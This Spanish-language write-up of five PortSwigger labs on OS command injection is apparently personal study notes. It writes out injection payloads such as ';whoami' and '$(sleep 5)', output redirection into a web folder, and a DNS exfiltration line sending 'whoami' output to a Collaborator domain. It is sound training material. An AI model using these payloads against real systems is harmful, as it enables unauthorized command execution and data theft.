---
aliases: ["PortSwigger OS Command Injection Labs"]
tags:
  - hacking/explotacion
  - herramientas/burpsuite
  - hacking/laboratorios
estado: 🟢 Terminado
---

# PortSwigger: 

## Lab: Inyección de comandos del sistema operativo (OS Command Injection), caso simple

En este laboratorio, debemos explotar una vulnerabilidad de ejecución de comandos. Según la descripción de la web, esta se encuentra en el apartado 'stock checker'. Para completarlo, debemos ejecutar el comando `whoami`.

Comenzaremos examinando el apartado 'stock checker':
![[Pasted image 20250922092642.png]]

Capturaremos la petición que se envía al hacer clic:

![[Pasted image 20250922092749.png]]

Observamos cómo se está realizando la petición. La hipótesis inicial es que uno de los dos parámetros es vulnerable a la ejecución de comandos. Dado que desconocemos la lógica interna y cómo se procesan los valores, debemos probar diferentes técnicas de inyección, como:

```bash
;whoami
|whoami
||whoami
&&whoami
```

> [!info] Operadores de Inyección de Comandos
> Los operadores de shell son cruciales para encadenar comandos.
> *   `;`: Ejecuta el siguiente comando independientemente del éxito del anterior.
> *   `|`: Redirige la salida del primer comando como entrada del segundo (pipe).
> *   `||`: Ejecuta el segundo comando SOLO si el primero falla.
> *   `&&`: Ejecuta el segundo comando SOLO si el primero tiene éxito.
> *   `$(comando)` o `` `comando` ``: Ejecuta el comando y sustituye su salida en la línea de comandos principal.

![[Pasted image 20250922093054.png]]

Observamos un error al intentar ejecutar el comando, pero la respuesta menciona 'bash', lo que indica que estamos en el camino correcto. Parece que estamos corrompiendo la petición al pasar el comando como un parámetro adicional. Por lo tanto, intentaremos añadir el comando al final de la petición para ver si es procesado correctamente:

![[Pasted image 20250922093347.png]]

¡Perfecto! Esta vez funcionó y nos devolvió la salida del comando:

![[Pasted image 20250922093448.png]]

Laboratorio terminado.

## Lab: Inyección de comandos del sistema operativo (OS Command Injection) ciega con retardos de tiempo

En este caso, la inyección de comandos es ciega (blind). El objetivo es causar que el servidor se demore en responder aproximadamente 10 segundos.

Dado que no sabemos dónde ocurre la posible inyección, comenzaremos capturando una sección donde haya entrada de datos, como el formulario "Submit Feedback" en la web:

![[Pasted image 20250922094541.png]]

Podemos observar múltiples campos que podrían ser inyectables. Para encontrar la vulnerabilidad, debemos probar uno por uno:

![[Pasted image 20250922094741.png]]

En campos como 'name', 'subject' y 'message', obtenemos la misma respuesta al enviar un `;` incluido en su contenido. Esto sugiere que estamos causando algún tipo de error. Podemos intentar enviar comandos, pero no veremos una respuesta directa, ya que, en esta ocasión, la inyección es ciega.

Podemos intentar ejecutar comandos que introduzcan un retardo de tiempo, lo que nos permitirá identificar si se están ejecutando:

![[Pasted image 20250922095007.png]]

Esto no funciona. Es posible que el comando se esté pasando como un parámetro. Sin embargo, si lo ejecutamos usando `$(sleep 5)`, lo que hace es ejecutar el comando e insertar su salida (en este caso, nada) en la línea de comandos principal, lo que a menudo permite la ejecución:

![[Pasted image 20250922095129.png]]

De esta forma, sí se permite la ejecución de comandos. Otra alternativa, en caso de que no se permitan caracteres como `()` o `$`, sería encapsular la petición con `;` de la siguiente manera:

![[Pasted image 20250922095312.png]]

> [!tip] Técnicas de Inyección Ciega Basada en Tiempo
> Para inyecciones de comandos ciegas, los retardos de tiempo son una técnica fundamental.
> *   **Linux**: `sleep N` (donde N es el número de segundos).
> *   **Windows**: `ping -n N 127.0.0.1` (donde N es el número de pings, aproximadamente N segundos).
> La clave es observar el tiempo de respuesta del servidor. Un retardo significativo y consistente después de inyectar un comando `sleep` o `ping` confirma la ejecución.

En este caso, en el parámetro 'name' no funcionó de esa manera, pero en 'email' sí. Por lo tanto, es muy importante tener esto en cuenta al realizar pruebas.

Ahora, completemos el laboratorio enviando un `sleep` de 10 segundos:

![[Pasted image 20250922095442.png]]

Laboratorio terminado.

## Lab: Inyección de comandos del sistema operativo (OS Command Injection) ciega con redirección de salida

En este laboratorio, se nos informa que existe una ruta `www/images` que permite almacenar imágenes. Dado que la inyección es ciega, podemos usar esta ruta para almacenar la salida de un comando en un archivo.

La inyección se encuentra en el mismo formulario de feedback que en el laboratorio anterior, por lo que comenzaremos directamente:

![[Pasted image 20250922102522.png]]

En este caso, el objetivo sería identificar el punto de inyección de comandos, pero como ya lo conocemos, lo primero será ejecutar un `sleep` para confirmar que es válido:

![[Pasted image 20250922102705.png]]

Sí, es válido. En este punto, ejecutaremos un comando y redirigiremos su salida a la ruta especificada, con el nombre `test.txt`, para que se almacene:

![[Pasted image 20250922102831.png]]

> [!info] Redirección de Salida en OS Command Injection
> La redirección de salida (`>`, `>>`, `2>`, `&>`) es una técnica vital en inyecciones ciegas para exfiltrar información.
> *   `comando > archivo`: Redirige la salida estándar (stdout) de `comando` a `archivo`, sobrescribiendo si existe.
> *   `comando >> archivo`: Redirige la salida estándar (stdout) de `comando` a `archivo`, añadiendo al final si existe.
> *   `comando 2> archivo`: Redirige la salida de error estándar (stderr) de `comando` a `archivo`.
> *   `comando &> archivo`: Redirige tanto stdout como stderr a `archivo`.
> En este laboratorio, al redirigir la salida a un directorio accesible por el servidor web (`www/images`), podemos luego navegar a `www.ejemplo.com/images/test.txt` para ver el contenido.

Vemos que, al parecer, funcionó. En este punto, podemos verificar la ruta donde, mediante una imagen, descubrimos cómo se están cargando los archivos. Observamos lo siguiente:

![[Pasted image 20250922102917.png]]

Y con esto, el laboratorio debería resolverse:
![[Pasted image 20250922102939.png]]

Laboratorio terminado.

## Lab: Inyección de comandos del sistema operativo (OS Command Injection) ciega con interacción fuera de banda (Out-of-Band)

En este laboratorio, veremos cómo podemos observar los comandos ejecutados a nivel de sistema cuando no tenemos ninguna forma de verlos o almacenarlos, como en el laboratorio anterior.

Ya conocemos el punto de inyección, por lo que procedemos a capturar la petición para poder analizarla:

![[Pasted image 20250922103346.png]]

¡Perfecto! Ya sabemos cuál es el parámetro en el que vamos a inyectar, por lo que solo lo comprobaremos por rutina:

![[Pasted image 20250922103703.png]]

Al parecer, funciona. En este punto, lo único que nos pide el laboratorio es que realicemos una solicitud al Burp Collaborator con `nslookup` de la siguiente manera:

![[Pasted image 20250922104107.png]]

> [!warning] Interacción Fuera de Banda (Out-of-Band - OOB)
> Las técnicas OOB son esenciales para detectar y explotar vulnerabilidades ciegas donde no hay una respuesta directa o un canal de exfiltración de datos claro.
> *   **DNS Lookup**: Utiliza comandos como `nslookup` o `dig` para forzar una consulta DNS a un dominio controlado (como Burp Collaborator). Si la consulta llega, confirma la ejecución del comando.
> *   **HTTP Request**: Utiliza herramientas como `curl` o `wget` para forzar una petición HTTP a un servidor controlado.
> *   **SMTP/SMB**: Menos comunes, pero también pueden usarse para exfiltración o confirmación.
> Burp Collaborator es una herramienta ideal para esto, ya que proporciona un servidor DNS, HTTP y SMTP único para cada prueba, registrando todas las interacciones.

Si revisamos el Collaborator, veremos lo siguiente:

![[Pasted image 20250922104138.png]]

¡Perfecto! Sí nos llegaron las solicitudes, y esto es todo:
![[Pasted image 20250922104153.png]]

Laboratorio terminado.

## Lab: Inyección de comandos del sistema operativo (OS Command Injection) ciega con exfiltración de datos fuera de banda (Out-of-Band)

Este laboratorio es prácticamente lo mismo que el anterior, con la diferencia de que en este punto debemos enviar información a través de la petición. En este caso, se nos pide la salida del comando `whoami`.

De igual forma, tenemos el punto de inyección de comandos y vamos a ir directamente a ejecutarlo, ya que sabemos dónde se están inyectando los comandos. En este punto, veremos que para la solicitud hacemos:

![[Pasted image 20250922105008.png]]

> [!tip] Exfiltración de Datos OOB con DNS
> Para exfiltrar datos a través de DNS en una inyección ciega, se puede concatenar la salida de un comando con un subdominio único y luego realizar una consulta DNS a ese subdominio en un dominio controlado.
> Ejemplo: `$(whoami).tu_dominio_collaborator.burpcollaborator.net`
> El servidor DNS del Collaborator registrará una consulta para `[nombre_de_usuario].tu_dominio_collaborator.burpcollaborator.net`, revelando el nombre de usuario. Es importante codificar caracteres especiales si la salida del comando puede contenerlos.

En este caso, hicimos uso del otro tipo de inyección mediante el cual obtenemos el nombre de usuario del sistema:

![[Pasted image 20250922105041.png]]

¡Perfecto! Podemos ver si se completó el laboratorio:
![[Pasted image 20250922105132.png]]

Laboratorio terminado.
